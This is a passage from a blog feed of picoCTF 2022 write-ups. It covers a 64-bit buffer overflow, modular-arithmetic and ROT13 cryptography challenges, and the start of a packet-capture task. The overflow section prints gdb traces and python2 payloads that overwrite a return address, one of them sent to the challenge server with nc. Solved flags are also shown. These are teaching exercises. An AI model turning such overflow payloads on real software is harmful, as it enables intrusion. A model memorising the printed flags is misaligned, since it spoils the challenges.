program</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Please make your selection (rock/paper/scissors):</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">rockpaperscissors</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">You played: rockpaperscissors</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">The computer played: paper</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">You win! Play again?</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Type '1' to play a game</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Type '2' to exit the program</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">...</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Please make your selection (rock/paper/scissors):</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">rockpaperscissors</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">You played: rockpaperscissors</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">The computer played: scissors</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">You win! Play again?</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Congrats, here's the flag!</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[REDACTED]</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[x-sixty-what]]></title>
            <link>https://kbbgl.github.io/blog/pico_2022/binary_exploitation/x-sixty-what/README</link>
            <guid>https://kbbgl.github.io/blog/pico_2022/binary_exploitation/x-sixty-what/README</guid>
            <pubDate>Thu, 26 Sep 2024 20:59:28 GMT</pubDate>
            <description><![CDATA[Description]]></description>
            <content:encoded><![CDATA[<h2 class="anchor anchorWithStickyNavbar_LWe7" id="description">Description<a href="https://kbbgl.github.io/blog/pico_2022/binary_exploitation/x-sixty-what/README#description" class="hash-link" aria-label="Direct link to Description" title="Direct link to Description">​</a></h2>
<p>Overflow x64 code</p>
<p>Most problems before this are 32-bit x86. Now we'll consider 64-bit x86 which is a little different! Overflow the buffer and change the return address to the flag function in this <a href="https://artifacts.picoctf.net/c/192/vuln" target="_blank" rel="noopener noreferrer">program</a>.</p>
<p>Download <a href="https://artifacts.picoctf.net/c/192/vuln.c" target="_blank" rel="noopener noreferrer">source</a></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">nc saturn.picoctf.net 50079</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="fuzzing">Fuzzing<a href="https://kbbgl.github.io/blog/pico_2022/binary_exploitation/x-sixty-what/README#fuzzing" class="hash-link" aria-label="Direct link to Fuzzing" title="Direct link to Fuzzing">​</a></h2>
<p>We notice that <code>#define BUFFSIZE 64</code> so we can crash it immediataly by:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">python2 -c "print('U' * 64 + '1234')"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU1234</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">gdb ./vuln-64</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Reading symbols from ./vuln-64...</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">(gdb) b *(vuln +29)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Breakpoint 1 at 0x401ece: file vuln.c, line 26.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">(gdb) r</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Starting program: vuln-64 </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Welcome to 64-bit. Give me a string that gets you the flag: </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU1234</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">(gdb) c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Continuing.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Program received signal SIGSEGV, Segmentation fault.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">main (argc=&lt;error reading variable: Cannot access memory at address 0x7f0034333225&gt;, </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    argv=&lt;error reading variable: Cannot access memory at address 0x7f0034333219&gt;) at vuln.c:36</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="stack">Stack<a href="https://kbbgl.github.io/blog/pico_2022/binary_exploitation/x-sixty-what/README#stack" class="hash-link" aria-label="Direct link to Stack" title="Direct link to Stack">​</a></h2>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">(gdb) i r $rsp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">rsp            0x7fffffffd698      0x7fffffffd698</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">(gdb) i r $rbp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">rbp            0x7fffffffd6d8      0x7fffffffd6d8</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>So the size is 64 in decimal.</p>
<p>Send a payload with 6 digits:</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">(gdb) r</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">The program being debugged has been started already.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Start it from the beginning? (y or n) y</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Starting program: vuln-64 </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Welcome to 64-bit. Give me a string that gets you the flag: </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUAAAAAA</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Breakpoint 1, vuln () at vuln.c:26</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">26      }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">(gdb) x/20xg $rsp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x7fffffffd698: 0x5555555555555555      0x5555555555555555</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x7fffffffd6a8: 0x5555555555555555      0x5555555555555555</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x7fffffffd6b8: 0x5555555555555555      0x5555555555555555</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x7fffffffd6c8: 0x5555555555555555      0x5555555555555555</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x7fffffffd6d8: 0x0000414141414141      0x0000000000401f37</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x7fffffffd6e8: 0x00007fffffffd838      0x0000000100000000</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x7fffffffd6f8: 0x000003e8004c1018      0x0000000000402f20</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x7fffffffd708: 0x0000000000402750      0x0000000000000000</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x7fffffffd718: 0x0000000100000000      0x00007fffffffd838</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">0x7fffffffd728: 0x0000000000401ed1      0x0000000000000000</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Locally, when running agains our own compiled version of <code>./vuln.c</code>, we're able to retrieve the debug flag:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">python2 -c "print('U' * 72 + '\x35\x1e\x40')" | ./vuln-64</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Welcome to 64-bit. Give me a string that gets you the flag: </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">picoCTF{some_flag}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[1]    222188 done                              python2 -c "print('U' * 72 + '\x35\x1e\x40')" | </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">       222189 segmentation fault (core dumped)  ./vuln-64</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Finally got it to work after seeing the 2nd hint:</p>
<blockquote>
<p>Jump to the second instruction (the one after the first push) in the flag function, if you're getting mysterious segmentation faults.</p>
</blockquote>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cat &lt;(python2 -c "print('U' * 72 + '\x3b\x12\x40')") - | nc saturn.picoctf.net 52707</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Welcome to 64-bit. Give me a string that gets you the flag: </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">picoCTF{b1663r_15_b3773r_11c407bc}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[basic-mod1]]></title>
            <link>https://kbbgl.github.io/blog/pico_2022/cryptography/basic-mod1/README</link>
            <guid>https://kbbgl.github.io/blog/pico_2022/cryptography/basic-mod1/README</guid>
            <pubDate>Thu, 26 Sep 2024 20:59:28 GMT</pubDate>
            <description><![CDATA[Description]]></description>
            <content:encoded><![CDATA[<h2 class="anchor anchorWithStickyNavbar_LWe7" id="description">Description<a href="https://kbbgl.github.io/blog/pico_2022/cryptography/basic-mod1/README#description" class="hash-link" aria-label="Direct link to Description" title="Direct link to Description">​</a></h2>
<p>We found this weird message being passed around on the servers, we think we have a working decrpytion scheme.</p>
<p>Download the message <a href="https://artifacts.picoctf.net/c/393/message.txt" target="_blank" rel="noopener noreferrer">here</a>.</p>
<p>Take each number mod 37 and map it to the following character set: 0-25 is the alphabet (uppercase), 26-35 are the decimal digits, and 36 is an underscore.</p>
<p>Wrap your decrypted message in the picoCTF flag format (i.e. <code>picoCTF\{decrypted_message\}</code>)</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="flag">Flag<a href="https://kbbgl.github.io/blog/pico_2022/cryptography/basic-mod1/README#flag" class="hash-link" aria-label="Direct link to Flag" title="Direct link to Flag">​</a></h2>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">flag.py</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">picoCTF{R0UND_N_R0UND_79C18FB3}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[basic-mod2]]></title>
            <link>https://kbbgl.github.io/blog/pico_2022/cryptography/basic-mod2/README</link>
            <guid>https://kbbgl.github.io/blog/pico_2022/cryptography/basic-mod2/README</guid>
            <pubDate>Thu, 26 Sep 2024 20:59:28 GMT</pubDate>
            <description><![CDATA[Description]]></description>
            <content:encoded><![CDATA[<h2 class="anchor anchorWithStickyNavbar_LWe7" id="description">Description<a href="https://kbbgl.github.io/blog/pico_2022/cryptography/basic-mod2/README#description" class="hash-link" aria-label="Direct link to Description" title="Direct link to Description">​</a></h2>
<p>Download the message <a href="https://artifacts.picoctf.net/c/499/message.txt" target="_blank" rel="noopener noreferrer">here</a>.</p>
<p>Take each number mod 41 and find the modular inverse for the result. Then map to the following character set: 1-26 are the alphabet, 27-36 are the decimal digits, and 37 is an underscore.</p>
<p>Wrap your decrypted message in the picoCTF flag format (i.e. <code>picoCTF\{decrypted_message\}</code>)</p>]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[credstuf]]></title>
            <link>https://kbbgl.github.io/blog/pico_2022/cryptography/credstuff/README</link>
            <guid>https://kbbgl.github.io/blog/pico_2022/cryptography/credstuff/README</guid>
            <pubDate>Thu, 26 Sep 2024 20:59:28 GMT</pubDate>
            <description><![CDATA[Description]]></description>
            <content:encoded><![CDATA[<h2 class="anchor anchorWithStickyNavbar_LWe7" id="description">Description<a href="https://kbbgl.github.io/blog/pico_2022/cryptography/credstuff/README#description" class="hash-link" aria-label="Direct link to Description" title="Direct link to Description">​</a></h2>
<p>We found a leak of a blackmarket website's login credentials.
Can you find the password of the user <code>cultiris</code> and successfully decrypt it?</p>
<p>Download the leak <a href="https://artifacts.picoctf.net/c/534/leak.tar" target="_blank" rel="noopener noreferrer">here</a>.</p>
<p>The first user in <code>usernames.txt</code> corresponds to the first password in <code>passwords.txt</code>. The second user corresponds to the second password, and so on.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="research">Research<a href="https://kbbgl.github.io/blog/pico_2022/cryptography/credstuff/README#research" class="hash-link" aria-label="Direct link to Research" title="Direct link to Research">​</a></h2>
<p>We can find what line the username <code>cultiris</code> is in by using <code>awk</code>:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">awk '/cultiris/{ print NR; exit }' usernames.txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">378</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Let's see what's printed in this line in the passwords file:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sed -n 378p passwords.txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cvpbPGS{P7e1S_54I35_71Z3}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>In line 204, we find:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sed -n 204p usernames.txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">pico</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sed -n 204p passwords.txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">pICo7rYpiCoU51N6PicOr0t13</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>If we look at the last 5 characters of the password in line 204, <code>r0t13</code>, we see that there's a hint as to what type of cipher is used to encrypt the password, namely ROT13. It basically replaces the letter in the sequence with a letter 13 characters up in the alphabet.</p>
<p><img decoding="async" loading="lazy" src="https://upload.wikimedia.org/wikipedia/commons/2/2a/ROT13.png" alt="" class="img_ev3q"></p>
<p>Since we know that the expected flag format is <code>picoCTF{SOMEFLAG}</code>, we can test out the ROT13 with the first few letters:</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">c + 13 = p</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">v - 13 = i</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p - 13 = c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">b + 13 = o</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>We can use the built-in Python ROT13 decoder to get the flag:</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> codecs</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">codecs</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">decode</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">'cvpbPGS{P7e1S_54I35_71Z3}'</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">'rot_13'</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">'picoCTF{C7r1F_54V35_71M3}'</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Eavesdrop]]></title>
            <link>https://kbbgl.github.io/blog/pico_2022/forensics/eavesdrop/README</link>
            <guid>https://kbbgl.github.io/blog/pico_2022/forensics/eavesdrop/README</guid>
            <pubDate>Thu, 26 Sep 2024 20:59:28 GMT</pubDate>
            <description><![CDATA[Description]]></description>
            <content:encoded><![CDATA[<h2 class="anchor anchorWithStickyNavbar_LWe7" id="description">Description<a href="https://kbbgl.github.io/blog/pico_2022/forensics/eavesdrop/README#description" class="hash-link" aria-label="Direct link to Description" title="Direct link to Description">​</a></h2>
<p>Download <a href="https://kbbgl.github.io/assets/files/capture.flag-a500e88a2803dcc151cfa087354297a1.pcap" target="_blank">this packet</a> capture and find the flag.</p>
<p>Opening the dump in Wireshark, we can see that there's some conversation going on. By following the TCP stream, we can read the whole exchange:</p>
<blockquote>
<p>Hey, how do you decrypt this file again?<br>
<!-- -->You're serious?<br>
<!-- -->Yeah, I'm serious</p>
</blockquote>
